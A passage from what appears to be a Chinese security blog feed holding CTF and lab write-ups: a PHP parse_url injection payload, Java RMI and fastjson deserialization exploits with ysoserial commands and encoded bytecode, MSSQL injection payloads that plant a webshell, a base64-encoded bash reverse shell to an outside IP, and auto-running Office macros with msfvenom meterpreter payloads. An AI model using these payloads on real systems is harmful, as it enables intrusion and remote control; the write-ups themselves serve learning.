class="string">&#x27;host&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>这里的话直接写php代码到文件里是不行的，因为存在的<code>?</code>会被识别成<code>query</code></p><p>我们就是用html文件中的&lt; script language=‘php’&gt;标签来实现php的代码。这里记住，只需写一个&lt; script&gt;，不需要写&lt; /scirpt&gt;，因为/还会被parse_url函数当作path中的内容。</p><p><img src="../images/image-20230516153311944.png" alt="image-20230516153311944"></p><p><img src="../images/image-20230516153607169.png" alt="image-20230516153607169"></p><p>最终paylaod</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?u=http:<span class="comment">//&lt;script+language=&quot;php&quot;&gt;system(&#x27;cd+..;cd+..;cd+..;cat+_f1a_g_1s_h3re&#x27;);:/var/www/html/1.php</span></span><br></pre></td></tr></table></figure><p>这里的话用之前的<code>$&#123;PWD::1&#125;</code>来替代<code>/</code>也是可以的</p>]]></content>
      
      
      
        <tags>
            
            <tag> ctfshow-周末大挑战-parse_url </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java-RMI恶意服务</title>
      <link href="/posts/7aace6cb.html"/>
      <url>/posts/7aace6cb.html</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.bilibili.com/video/BV1L3411a7ax/?spm_id_from=333.999.0.0&amp;vd_source=bacfffe46b930fda5761b63367eb298c">参考视频</a></p><p><a href="https://xz.aliyun.com/t/9053#toc-1">参考文章</a></p><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>Java RMI机制能够让一台Java虚拟机上的对象调用运行在另一台Java虚拟机上的对象的方法。总结一下，RMI机制的实现依赖于以下三个部分</p><ul><li>RMI Server</li><li>RMI Registry</li><li>RMI Client</li></ul><p>简单概括一下RMI的流程：Server端事先在Registry处<code>bind</code>将要被调用的远程对象。当Client需要调用远程对象时，先根据<code>rmi://</code>地址连接到Registry，然后在Registry处查看是否绑定有需要的远程对象。如果有，则Registry返回Server端的<code>rmi://</code>地址以及开放的端口，Client据此连接到Server。然后才开始真正的远程方法调用，远程方法在Server端执行，Server将执行后的结果发送给Client。</p><h3 id="RMI的恶意利用"><a href="#RMI的恶意利用" class="headerlink" title="RMI的恶意利用"></a>RMI的恶意利用</h3><p>先创建两个项目</p><p><strong>RMIServer</strong></p><p><strong>RMIClient</strong></p><p>这两个项目都要有相同的接口</p><p><img src="../images/image-20230514164640177.png" alt="image-20230514164640177"></p><p><img src="../images/image-20230514164725676.png" alt="image-20230514164725676"></p><p>先创建两个项目，<strong>分别是客户端和服务端(然后有相同的接口)</strong></p><p><img src="../images/image-20230514164826518.png" alt="image-20230514164826518"></p><p>服务端已经开了个端口出去了，客户端就可以直接去进行访问</p><p>但是客户端并不知道开的端口是啥，这里就得通过这个注册中心开的端口来找</p><p>默认的是1099，然后又因为注册中心于服务端开放的端口绑定了，于是就可以通过注册中心来查到服务端开放的端口</p><p><img src="../images/image-20230514165804204.png" alt="image-20230514165804204"></p><p>这里的话是获取注册中心的端口，然后获取绑定的名字，然后在进行函数的调用</p><p><img src="../images/image-20230514165918336.png" alt="image-20230514165918336"></p><p>成功在服务端回显 这里调用的是服务端的sayHello()方法</p><p>这里客户端没写回显，所以没输出</p><p>上面就是简单的RMI的执行过程了</p><h4 id="攻击客户端"><a href="#攻击客户端" class="headerlink" title="攻击客户端"></a>攻击客户端</h4><h5 id="注册中心攻击客户端"><a href="#注册中心攻击客户端" class="headerlink" title="注册中心攻击客户端"></a>注册中心攻击客户端</h5><p>此方法可以攻击客户端和服务端</p><p>对于注册中心来说，我们还是从这几个方法触发：</p><ul><li>bind</li><li>unbind</li><li>rebind</li><li>list</li><li>lookup</li></ul><p>除了unbind和rebind都会返回数据给客户端，返回的数据是序列化形式，那么到了客户端就会进行反序列化，如果我们能控制注册中心的返回数据，那么就能实现对客户端的攻击，这里使用ysoserial的JRMPListener，命令如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener 1099  CommonsCollections1 &#x27;&#x27;</span><br></pre></td></tr></table></figure><p>这里的意思是开启一个恶意的RMI服务端</p><p><img src="../images/image-20230514180701300.png" alt="image-20230514180701300"></p><p>成功执行，只不过本地开的话java版本太高，开不了，所以就用kali的ip,执行不了计算器</p><p>这里即使调用unbind也会触发反序列化，推测是在之前传输一些约定好的数据时进行的序列化和反序列化。所以实际上这五种方法都可以达到注册中心反打客户端或服务端的目的</p><p><strong>剩下的去参考上面的文章就行了，因为其他的没有用到ysoserial服务端进行伪造</strong></p><h3 id="JEP290及其绕过"><a href="#JEP290及其绕过" class="headerlink" title="JEP290及其绕过"></a>JEP290及其绕过</h3><p><a href="https://xz.aliyun.com/t/9053#toc-9">参考文章</a></p><p>这里就不写了，因为写了也是照搬下来</p>]]></content>
      
      
      
        <tags>
            
            <tag> java-RMI恶意服务 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java-fastjson 链子分析</title>
      <link href="/posts/7ec3d05a.html"/>
      <url>/posts/7ec3d05a.html</url>
      
        <content type="html"><![CDATA[<p><a href="https://xz.aliyun.com/t/12096#toc-3">参考文章</a></p><p>这里用的是fastjson 1.2.24版本来进行分析</p><p><img src="../images/image-20230510112535170.png" alt="image-20230510112535170"></p><p><img src="../images/image-20230510115514716.png" alt="image-20230510115514716"></p><p>给上面的图片在添加一个条件，满足条件的getter也行</p><p>这就是fastjson和<strong>原生类</strong>的反序列化的不同之处</p><h3 id="JdbcRowSetImpl链子"><a href="#JdbcRowSetImpl链子" class="headerlink" title="JdbcRowSetImpl链子"></a>JdbcRowSetImpl链子</h3><p><strong>这个链子是必须出网的</strong></p><p><code>com.sun.rowset.JdbcRowSetImpl</code>中的<code>dataSourceName</code>属性 寻找他的set方法</p><p><img src="../images/image-20230517154056485.png" alt="image-20230517154056485"></p><p>然后跟进到他的<code>setdataSourceName</code>方法</p><p><img src="../images/image-20230517154148020.png" alt="image-20230517154148020"></p><p>这里就是把传进去的值赋给<code>dataSource</code></p><p>这里再看<code>autoCommit</code>属性，然后去查看他的set方法，<code>setautocommit</code>,需要传入一个布尔类型的参数</p><p><img src="../images/image-20230517154245264.png" alt="image-20230517154245264"></p><p>判断conn是否为空 不然就赋值 跟进connect方法</p><p><img src="../images/image-20230517154459890.png" alt="image-20230517154459890"></p><p><code>lookup(getDataSourceName())</code> lookup函数链接我们写入的服务 加载我们的恶意类<br>构造恶意类</p><p>根据最后的<code>connect()</code>方法，前面的操作就讲得通了</p><p>因为前面得<code>conn</code>默认为空，所以能进入下一层，然后又因为我们给了<code>DataSourceName</code>赋值，又可以进入下一层，然后就是<code>lookup()</code>函数进行连接了，连接得值刚好是<code>DataSourceName</code></p><h3 id="TemplatesImpl-链子"><a href="#TemplatesImpl-链子" class="headerlink" title="TemplatesImpl 链子"></a>TemplatesImpl 链子</h3><p><strong>这个链子是不出网的</strong></p><p><strong>poc</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//EvilCalss.java</span></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilClass</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">EvilClass</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">EvilClass</span> <span class="variable">evilClass</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EvilClass</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将其编译为字节码文件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64.Encoder;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloWorld</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span> &#123;</span><br><span class="line">        <span class="type">byte</span>[] buffer = <span class="literal">null</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">filepath</span> <span class="operator">=</span> <span class="string">&quot;.\\src\\main\\java\\test\\EvilClass.class&quot;</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filepath);</span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">byte</span>[] b = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">            <span class="type">int</span> n;</span><br><span class="line">            <span class="keyword">while</span>((n = fis.read(b))!=-<span class="number">1</span>) &#123;</span><br><span class="line">                bos.write(b,<span class="number">0</span>,n);</span><br><span class="line">            &#125;</span><br><span class="line">            fis.close();</span><br><span class="line">            bos.close();</span><br><span class="line">            buffer = bos.toByteArray();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">Encoder</span> <span class="variable">encoder</span> <span class="operator">=</span> Base64.getEncoder();</span><br><span class="line">        <span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> encoder.encodeToString(buffer);</span><br><span class="line">        System.out.println(value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yv66vgAAADQAJgoABwAXCgAYABkIABoKABgAGwcAHAoABQAXBwAdAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACkV4Y2VwdGlvbnMHAB4BAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYHAB8BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYHACABAApTb3VyY2VGaWxlAQAORXZpbENsYXNzLmphdmEMAAgACQcAIQwAIgAjAQAIY2FsYy5leGUMACQAJQEACUV2aWxDbGFzcwEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAcAAAAAAAQAAQAIAAkAAgAKAAAALgACAAEAAAAOKrcAAbgAAhIDtgAEV7EAAAABAAsAAAAOAAMAAAAKAAQACwANAAwADAAAAAQAAQANAAEADgAPAAIACgAAABkAAAADAAAAAbEAAAABAAsAAAAGAAEAAAARAAwAAAAEAAEAEAABAA4AEQACAAoAAAAZAAAABAAAAAGxAAAAAQALAAAABgABAAAAFAAMAAAABAABABAACQASABMAAgAKAAAAJQACAAIAAAAJuwAFWbcABkyxAAAAAQALAAAACgACAAAAFwAIABgADAAAAAQAAQAUAAEAFQAAAAIAFg</span><br></pre></td></tr></table></figure><p><strong>poc</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">POC1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;, \&quot;_bytecodes\&quot;:[\&quot;编码\&quot;], &#x27;_name&#x27;:&#x27;c.c&#x27;, &#x27;_tfactory&#x27;:&#123; &#125;,\&quot;_outputProperties\&quot;:&#123;&#125;, \&quot;_name\&quot;:\&quot;a\&quot;, \&quot;_version\&quot;:\&quot;1.0\&quot;, \&quot;allowedProtocols\&quot;:\&quot;all\&quot;&#125;&quot;</span>;</span><br><span class="line">        JSON.parseObject(payload, Feature.SupportNonPublicField);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Fastjson默认只会反序列化public修饰的属性，outputProperties和_bytecodes由private修饰，必须加入<code>Feature.SupportNonPublicField</code>在parseObject中才能触发；</p><h4 id="动态加载字节码分析"><a href="#动态加载字节码分析" class="headerlink" title="动态加载字节码分析"></a>动态加载字节码分析</h4><p>这里的话在我之前写过得一篇文章也有写这个  <a href="https://ke1nys.github.io/posts/30ead299.html">Java安全之BCEL ClassLoader</a></p><p>首先分析后半部分 即<code>TemplatesImpl</code>中的链子<br>由上文我们知道 ，fastjson使用<code>JSON.parseObject</code>方法反序列化会调用get 和set方法<br>在<code>TemplatesImpl</code>中属性的get和set方法中<br><code>getOutputProperties</code>方法调用了<code>newTransformer</code>方法</p><p><img src="../images/image-20230517160245013.png" alt="image-20230517160245013"></p><p>在<code>newTransformer</code>中调用了<code>getTransletInstance</code>方法</p><p><img src="../images/image-20230517161405853.png" alt="image-20230517161405853"></p><p>这里需要调用到<code>defineTransletClasses</code>所以需要使<code>_name!=null,_class == null</code></p><p><img src="../images/image-20230517161442419.png" alt="image-20230517161442419"></p><p>在defineTransletClasses中 重写了defineClass方法 对<code>_bytecodes</code>中的恶意代码进行加载</p><p><img src="../images/image-20230517161528118.png" alt="image-20230517161528118"></p><p>这部分其实就是CC4 的后半部分</p>]]></content>
      
      
      
        <tags>
            
            <tag> java-fastjson 链子分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mini-L CTF web 复现</title>
      <link href="/posts/fbdb0624.html"/>
      <url>/posts/fbdb0624.html</url>
      
        <content type="html"><![CDATA[<p>这里的话只复现部分题</p><p><a href="https://github.com/XDSEC/miniLCTF_2023/blob/main/Official/Web_Writeup.md">官方wp地址</a></p><h2 id="ezsql-sql-server-mssql"><a href="#ezsql-sql-server-mssql" class="headerlink" title="ezsql(sql server mssql)"></a>ezsql(sql server mssql)</h2><p><img src="../images/image-20230509212213754.png" alt="image-20230509212213754"></p><p><img src="../images/image-20230509213811523.png" alt="image-20230509213811523"></p><p><strong>考查的是sqlserver</strong> <strong>也是mssql</strong></p><p>这里的话是给了查询语句  <strong>列和表都给了  id users</strong></p><p>数据库查询</p><p><img src="../images/image-20230510105038552.png" alt="image-20230510105038552"></p><p><img src="../images/image-20230510105055721.png" alt="image-20230510105055721"></p><p><strong>查出来是ctf</strong>  在sqlserver中 <strong>数据库是db_name()</strong></p><p>拿出祖传字典fuzz一下，发现过滤了<strong>空格、星号、百分号、引号</strong>以及常用的增删查改关键字（<strong>但是大小写能绕过，这个点很重要</strong>）</p><p><a href="http://www.ppmy.cn/news/9311.html">SQL Server注入技巧与提权方式详解</a></p><p><img src="../images/image-20230509214305648.png" alt="image-20230509214305648"></p><p>可以了解一下这个空格绕过</p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1;ALTER%1eTABLE%1eusers�ADD�wcs�varchar(2000)�NULL;</span><br><span class="line">1;inSert�into�users(id,wcs,name)�values�(17,0x3c3f70687020706870696e666f28293b203f3e,36);</span><br><span class="line">1;declare�@wcs�varchar(2000)�set�@wcs=0x2f7661722f7777772f68746d6c2f6f6b6f6b2e706870�bacKup�log�ctf�to�disk=@wcs�with�init;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230509224513281.png" alt="image-20230509224513281"></p><p><img src="../images/image-20230509224610461.png" alt="image-20230509224610461"></p><p><a href="https://cn-sec.com/archives/1277068.html"><strong>日志备份和差异备份获取webshell</strong></a></p><p><a href="https://www.cnblogs.com/-qing-/p/10910282.html"><strong>Web渗透之mssql差异备份getshell</strong></a></p><p>这里有个小知识点就是得需要bp或则hackbar来写，输入框的话是不能解析url编码的，因为我们需要用url编码来进行空格的绕过</p><p><img src="../images/image-20230511095149341.png" alt="image-20230511095149341"></p><h2 id="minijava-RMI反序列化漏洞"><a href="#minijava-RMI反序列化漏洞" class="headerlink" title="minijava(RMI反序列化漏洞)"></a>minijava(<strong>RMI反序列化漏洞</strong>)</h2><p><img src="../images/image-20230511095830489.png" alt="image-20230511095830489"></p><p><strong>先使用jd-gui工具把class文件变成java文件</strong></p><p><img src="../images/image-20230513152909440.png" alt="image-20230513152909440"></p><p>1.先导入pom.xml里面的东西</p><p>2.然后按照jar包里面的构造来idea里面构造个一模一样的</p><p>然后在把jar里面的内容照搬进去就行了</p><p>这道题如果是对经常做java题目的师傅来看的话是一下就能看出是利用RMI来打的</p><p><img src="../images/image-20230511101201537.png" alt=" "></p><p>先去查看一下pom.xml，发现是cc3的链子</p><p><img src="../images/image-20230511102446188.png" alt="image-20230511102446188"></p><p>因为这里添加了个白名单过滤，所以说不能直接用cc3来打了</p><p>然后去看了一下MainController.class</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">  <span class="meta">@RequestMapping(&#123;&quot;/hello&quot;&#125;)</span></span><br><span class="line">  <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">(<span class="meta">@RequestParam(name = &quot;data&quot;, required = false)</span> String data)</span> &#123;</span><br><span class="line">    <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="type">byte</span>[] userData = Base64.getDecoder().decode(data);</span><br><span class="line">      <span class="type">SerialKiller</span> <span class="variable">serialKiller</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SerialKiller</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(userData), <span class="string">&quot;serialkiller.conf&quot;</span>);</span><br><span class="line">      user = (User)serialKiller.readObject();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="string">&quot;unserialize error, no!&quot;</span>;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;unserialize done, &quot;</span> + user.getUsername() + <span class="string">&quot; have fun!&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后就去查看这个readObject() 这里显示是User这个类里边的</p><p><img src="../images/image-20230511102938179.png" alt="image-20230511102938179"></p><p>这里边的registry和lookup做题多的一看就知道是rmi恶意服务</p><p>这里的话registry1可控，然后只需要绕过上面的的if判断就行了</p><p>然后打<strong>RMI反序列化漏洞</strong>，最终可以实现绕过白名单任意反序列化，从而打CC链来rce</p><p><strong>这里如果是是用hackbar发包的话，得注意要进行url编码，不会会失败</strong></p><p><strong>payload</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener <span class="number">1099</span> CommonsCollections6 <span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDEuNDIuMzkuMTEwLzY2NiAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span></span><br></pre></td></tr></table></figure><p><strong>需要在自己的服务器上执行</strong></p><p>接下来就不写了  直接去看官方的wp吧 <a href="https://github.com/XDSEC/miniLCTF_2023/blob/main/Official/Web_Writeup.md">官方wp</a></p><p>接下来就写篇文章来学习一下<strong>RMI</strong>和<strong>cc3</strong></p>]]></content>
      
      
      
        <tags>
            
            <tag> Mini-L CTF web 复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>thm-红队-初始访问-武器化</title>
      <link href="/posts/add7d84.html"/>
      <url>/posts/add7d84.html</url>
      
        <content type="html"><![CDATA[<p>前两个是 VBScript 代码  和  HTA代码</p><p>前者是可以在本地上运行，后者是可以弹shell也可以在本地运行</p><h3 id="应用程序的-Visual-Basic-VBA"><a href="#应用程序的-Visual-Basic-VBA" class="headerlink" title="应用程序的 Visual Basic (VBA)"></a>应用程序的 Visual Basic (VBA)</h3><p><strong>这是 Microsoft 为 Microsoft Word、Excel、PowerPoint 等 Microsoft 应用程序实施的一种编程语言</strong></p><p><strong>VBA 编程允许自动执行用户与 Microsoft Office 应用程序之间几乎所有键盘和鼠标交互的任务。</strong> </p><p>这句话是重点</p><p><strong>宏是 Microsoft Office 应用程序，其中包含以称为 Visual Basic for Applications (VBA) 的编程语言编写的嵌入式代码。它用于创建自定义功能，以通过创建自动化流程来加速手动任务</strong></p><p><strong>我们将讨论 VBA 的基础知识以及对手使用宏创建恶意 Microsoft 文档的方式</strong>。</p><p>现在创建一个新的空白 Microsoft 文档来创建我们的第一个 宏。目的是讨论该语言的基础知识，并展示如何在打开 Microsoft Word 文档时运行它。首先，我们需要通过选择 视图→ 宏来打开 Visual Basic 编辑器。宏窗口显示在文档中创建我们自己的宏</p><p><img src="../images/image-20230508231520977.png" alt="image-20230508231520977"></p><p><img src="../images/image-20230508231606126.png" alt="image-20230508231606126"></p><p>点击创建后的样子</p><p>然后进行内容创建</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Sub THM()</span><br><span class="line">  MsgBox (&quot;Welcome to Weaponization Room!&quot;)</span><br><span class="line">End Sub</span><br></pre></td></tr></table></figure><p>然后点击运行<img src="../images/image-20230508231803055.png" alt="image-20230508231803055"></p><p>现在，为了在文档打开后自动执行 VBA 代码，我们可以使用内置函数，例如 AutoOpen 和 Document_open。请注意，我们需要指定文档打开后需要运行的函数名称，在我们的例子中是 THM 函数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Sub Document_Open()</span><br><span class="line">  THM</span><br><span class="line">End Sub</span><br><span class="line"></span><br><span class="line">Sub AutoOpen()</span><br><span class="line">  THM</span><br><span class="line">End Sub</span><br><span class="line"></span><br><span class="line">Sub THM()</span><br><span class="line">   MsgBox (&quot;Welcome to Weaponization Room!&quot;)</span><br><span class="line">End Sub</span><br></pre></td></tr></table></figure><p>重要的是要注意，要使宏起作用，我们需要将其保存为启用宏的格式，例如.doc 和 docm。现在让我们将文件保存为Word 97-2003 模板，通过转到文件→保存 Document1并保存为类型 → Word 97-2003 文档启用 宏，最后保存.</p><p><img src="../images/image-20230508232155649.png" alt="image-20230508232155649"></p><p>运行文档后就会自动执行</p><p><strong><img src="../images/image-20230508232335996.png" alt="image-20230508232335996"></strong></p><p>现在编辑 word 文档并创建一个执行calc.exe 或任何可执行文件的宏函数作为概念证明，如下所示</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Sub PoC()</span><br><span class="line">Dim payload As String</span><br><span class="line">payload = &quot;calc.exe&quot;</span><br><span class="line">CreateObject(&quot;Wscript.Shell&quot;).Run payload,0</span><br><span class="line">End Sub</span><br></pre></td></tr></table></figure><p>和前面保存的步骤一样，然后点击运行就弹出计算器了</p><p>得一提的是，我们可以将 VBA 与之前介绍的方法（例如 HTA 和 WSH）结合使用。VBA/宏本身并不能绕过任何检测</p><p><strong>接下来是利用VBA进行shell的反弹</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">user@AttackBox$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.50.159.15 LPORT=443 -f vba</span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span><br><span class="line">[-] No arch selected, selecting arch: x86 from the payload</span><br><span class="line">No encoder specified, outputting raw payload</span><br><span class="line">Payload size: 341 bytes</span><br><span class="line">Final size of vba file: 2698 bytes</span><br></pre></td></tr></table></figure><p><strong>导入以注意</strong>需要进行一项修改才能使此工作正常进行。输出将在 MS Excel 工作表上工作。因此，将 Workbook_Open()更改为 Document_Open()以使其适用于 MS word 文档。</p><p>然后把生成的代码写到word的宏编辑器里边</p><p>然后设置监听器</p><figure 